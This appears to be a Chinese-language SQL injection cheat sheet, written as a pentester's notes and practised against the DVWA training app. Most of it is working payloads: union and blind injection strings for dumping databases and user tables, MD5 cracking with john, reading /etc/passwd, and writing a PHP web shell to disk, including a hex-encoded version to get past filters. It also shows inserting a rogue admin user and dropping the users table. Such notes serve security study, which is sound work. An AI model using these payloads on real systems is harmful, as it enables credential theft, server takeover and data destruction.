# SQL注入

## 0x01 漏洞成因
> 服务器程序将用户输入参数作为查询条件,直接拼接SQL语句,并将查询结果返回给客户端程序.

举例: 用户登录判断
```sql
SELECT * FROM users WHERE user=‘uname' AND password=‘pass‘ SELECT * FROM users WHERE user=‘name' AND password='' OR ''='‘
```

## 0x02 漏洞的检测
- 基于报错的检测
> 输入`', ", %, (), `等可能造成
   基于布尔的检测
```sql
1’ and ‘1’=‘1 同  1’ and ‘1
1’ and ‘1’=‘2 同  1’ and ‘0
```
- 检测表列数/显示信息位于那一列
```sql
'order by 10 --++  # 按查询列数排序(--为注释符,后面必须有空格,空格可用+代表)
```
- 联合查询
```sql
'union select 1,2 --+
'union all select database(),2 --+
```

## 0x03 一些有用信息的探测
### 常用函数
- `'union+select+database(),substring_index(USER(),"@",1)+--+`
- DB用户: `user()`
- DB版本: `version()`
- 全局函数: `@@datadir, @@hostname, @@VERSION, @@version_compile_os`
- 当前库: `database()`
- ASCII转字符串: `char()`
- 连接字符串: `CONCAT_WS(CHAR(32,58,32),user(),database(),version())`, `concat(user(),0x3a,database())`
- 计算哈希: `md5()`

### `information_schema`的利用
- 所有库所有表 `'union select table_name,table_schema from information_schema.tables--+compile_os)--+`
- 统计每个库中表的数量 `'UNION select table_schema,count(*) FROM information_Schema.tables group by table_schema--`
- 显示DVWA库中的表名`' union select table_name,null from information_schema.tables where table_schema='dvwa'--+`
- 显示表中所有的列`' union select table_name,column_name from information_schema.columns where table_schema='dvwa' and table_name='users'--+`
- 查询user,password  
```sql
' union select user,password from dvwa.users--+
' union select user,password from users--+
' union select null, concat(user,0x3a,password) from users--+
```
**注**: 如果密码是md5加密,可以尝试用`john`破解
如:
破解dvwa.txt内容:
```text
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
```
执行指令
```bash
之前没有破解过:john --format=raw-MD5 ./dvwa.txt
执行已经破解过:john --format=raw-MD5 ./dvwa.txt --show 或 进入家目录.john目录下查看john.pot
```
## 0x04读写文件利用
- 读取文件: `' union select null, load_file('/etc/passwd')--+`
- 写入文件

```sql
理想状态(数据库不以mysql用户执行,而是以类型root的用户执行): 
' union select null,"<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE "/var/www/a.php" --+
不然就先写入/tmp目录再结合文件包含漏洞
' union select null,"<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/tmp/a.php' --+
之后利用文件包含漏洞执行
http://192.168.0.107/dvwa/vulnerabilities/fi/?page=/tmp/a.php&cmd=ls

十六进制编码绕过过滤举例:
先提取网马的十六进制:
cat shell.php | xxd -ps | tr -d '\n'
再写文件
' union select null,(0x3c3f706870206563686f207368656c6c5f6578656328245f4745545b27636d64275d293b3f3e0a) 
INTO DUMPFILE '/tmp/b.php' --+
```

- 保存下载数据库`' union select null, concat(user,0x3a,password) from users INTO OUTFILE "/tmp/db.db"--+`再结合文件包含漏洞吧.
- 其他思路(前提,探测出数据库用户名及密码)
  - 解不了用户密码,可以用Navicat等工具连接数据库,直接自己先生成密码,然后覆盖.
  - 自己写一个功能表单(前提,对数据库的结构有了了解),如对DVWA的功能表单  
```php
' union select null,'<?php if(isset($_POST["submit"])) { $userID = $_POST["userID"]; $first_name = $_POST["first_name"]; $last_name = $_POST["last_name"]; $username = $_POST["username"]; $avatar = $_POST["avatar"]; echo "userID: $userID<BR>"; echo "first_name: $first_name<BR>"; echo "last_name: $last_name<BR>"; echo "username: $username<BR>"; echo "avatar: $avatar<BR>"; $con=mysqli_connect("127.0.0.1","root","","dvwa"); if (mysqli_connect_errno()) { echo "Failed to connect to MySQL: " . mysqli_connect_error(); } else { echo "Connected to database<BR>"; } $password = "123"; $sql="insert into dvwa.users values (\\"$userID\\",\ \"$first_name\\",\\"$last_name\\",\\"$username\\",MD5(\\"$password\\"),\\"$avatar\ \")"; if (mysqli_query($con,$sql)) { echo "[Successful Insertion]: $sql"; } else { echo "Error creating database: " . mysqli_error($con); } mysqli_close($con); } ?> <form method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>"> <input type="text" name="userID" value="33"><br> <input type="text" name="first_name" value="fh"><br> <input type="text" name="last_name" value="y"><br> <input type="text" name="username" value="yfh"><br> <input type="text" name="avatar" value="yfh!"><br> <input type="submit" name="submit" value="Submit Form"><br> </form>' INTO DUMPFILE '/tmp/user.php' --+
```
再通过文件包含漏洞访问功能表单.

## 0x05无权读取`information_schema`/拒绝union, order by 语句
- 猜列名:`' and column is null --+ ` 利用Burp的intruder辅助猜解column
- 猜当前表表名:`' and table.user is null -- + `, 假设user为已知列,测table
- 猜库里其他表: `'and (select count(*) from table)>0--+`
- 猜表里对应关系:`'and users.user is null--+`
- 猜字段内容: `'or user='admin`, `'or user like '%a%`

## 0x06当数据库可写常用操作
- `'; update users set password='xxx' where user='admin`  //可能会由于程序代码问题执行不成功,参见 http://dev.mysql.com/doc/refman/5.7/en/commands-out-of-sync.html
- `';INSERT INTO users('user_id', 'first_name', 'last_name', 'user', 'password', 'avatar') VALUES('34', 'fh', 'yuan', 'yfh', '5f4dcc3b5aa765d61d8327deb882cf99', 'OK'); ` 添加一个新用户(语句测试在mysql控制台成功,在dvwa测试不成功,可能是php问题)
- `'DROP TABLE users;--+`,搞破坏

## 0x07 一些过滤函数
- mysql_real_escape_string()
  - php4.3<version()<php5.5
  - 对  `\x00, \n , \r, \, ', ", \x1a等进行转义`
- `stripslashes()` 去除`\`
- `is_numeric()`判断是否为数字

## 0x08 SQL盲注
### 简言之,检测注入的时候不显示报错信息,较难判断提交数据是否插入sql语句中
### 检测方法
#### 利用布尔条件由返回页面的差异判断

```sql
1' order by 5--+  
1' order by 2--+  
1' union select 1,2--+
1' union select null,CONCAT_WS(CHAR(32,58,32),user(),database(),version())--+ 1' and 1=0 union select null,table_name from information_schema.tables#
1' and 1=0 union select null,table_name from information_schema.columns where table_name='users' #
```
**注意:**必须有一个正确的执行语句插入.
#### 同样当无权读取`information_schema`/拒绝union, order by 语句
- 猜列名:`1' and column is not null --+ ` 利用Burp的intruder辅助猜解column
- 猜当前表表名:`1' and table.user is not null -- + `, 假设user为已知列,测table
- 猜库里其他表: `1'and (select count(*) from table)>0--+`
- 猜表里对应关系:`1'and users.user is not null--+`
- 猜字段内容: `1'or user='admin`, `'or user like '%a%--+`
- 猜密码: `2' or user='admin' and password='5f4dcc3b5aa765d61d8327deb882cf99' -- `

#### 返回页面不能显示信息
- 但返回页面稍有不同,可以做真假判断.可以尝试利用与运算一位一位的推算
`1' and ORD(MID((VERSION()),1,1))&1>0--+`,     
`1' and ORD(MID((VERSION()),1,1))&1>4--+`
> mysql中位运算的与运算是&，我们主要用它来进行猜测，比如a的ascii码是1100001，那么我们可以使用1,2,4,8,16…..依次与他进行与运算，最终得到结果。
- 利用sleep()函数检查页面返回时间的差异`1'union select sleep(find_in_set(mid(@@version, 1, 1), '0,1,2,3,4,5,6,7,8,9,.')),null --+`

### 常用函数

参考自： http://rcoil.me/2017/11/MySQL-%E7%9B%B2%E6%B3%A8%E6%B5%85%E6%9E%90/

- ### mid()函数

  语法为：

  ```sql
  SELECT MID(column_name,start[,length]) FROM table_name;
  ```

  - column_name 必需。要提取字符的字段。
  - start 必需。规定开始位置（起始值是 1）。
  - length 可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。

- ### substr()函数

  语法为：

  ```sql
  SELECT SUBSTR(column_name,start[,length]) FROM table_name;
  ```

  描述和用法与`mid()`函数是一样的。

- ### Left()函数

  语法为：

  ```sql
  SELECT LEFT(ARG,LENGTH) FROM table_name;
  ```

  取一个字符串的前若干位
